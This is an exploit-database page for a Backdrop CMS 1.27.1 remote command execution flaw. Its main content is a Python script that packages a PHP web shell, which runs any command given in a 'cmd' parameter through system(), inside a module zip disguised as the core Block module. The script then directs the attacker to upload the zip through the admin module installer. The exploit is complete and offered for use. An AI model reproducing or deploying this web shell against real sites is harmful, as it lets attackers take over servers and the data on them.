---
title: Backdrop CMS 1.27.1 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2024050056
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-21
fetch_date: 2025-10-06T16:48:59.369488
---

# Backdrop CMS 1.27.1 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdrop CMS 1.27.1 Remote Command Execution** **2024.05.20**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: Backdrop CMS 1.27.1 - Remote Command Execution (RCE)
# Date: 04/27/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://backdropcms.org/
# Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip
# Version: latest
# Tested on: MacOS
import os
import time
import zipfile
def create\_files():
info\_content = """
type = module
name = Block
description = Controls the visual building blocks a page is constructed
with. Blocks are boxes of content rendered into an area, or region, of a
web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP\_VERSION
backdrop = 1.x
configure = admin/structure/block
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
"""
shell\_info\_path = "shell/shell.info"
os.makedirs(os.path.dirname(shell\_info\_path), exist\_ok=True) # Klasörü
oluşturur
with open(shell\_info\_path, "w") as file:
file.write(info\_content)
shell\_content = """
<html>
<body>
<form method="GET" name="<?php echo basename($\_SERVER['PHP\_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($\_GET['cmd']))
{
system($\_GET['cmd']);
}
?>
</pre>
</body>
</html>
"""
shell\_php\_path = "shell/shell.php"
with open(shell\_php\_path, "w") as file:
file.write(shell\_content)
return shell\_info\_path, shell\_php\_path
def create\_zip(info\_path, php\_path):
zip\_filename = "shell.zip"
with zipfile.ZipFile(zip\_filename, 'w') as zipf:
# Dosyaları shell klasörü altında sakla
zipf.write(info\_path, arcname='shell/shell.info')
zipf.write(php\_path, arcname='shell/shell.php')
return zip\_filename
def main(url):
print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
time.sleep(3)
print("Evil module generating...")
time.sleep(2)
info\_path, php\_path = create\_files()
zip\_filename = create\_zip(info\_path, php\_path)
print("Evil module generated!", zip\_filename)
time.sleep(2)
print("Go to " + url + "/admin/modules/install and upload the " +
zip\_filename + " for Manual Installation.")
time.sleep(2)
print("Your shell address:", url + "/modules/shell/shell.php")
if \_\_name\_\_ == "\_\_main\_\_":
import sys
if len(sys.argv) < 2:
print("Usage: python script.py [url]")
else:
main(sys.argv[1])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050056)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top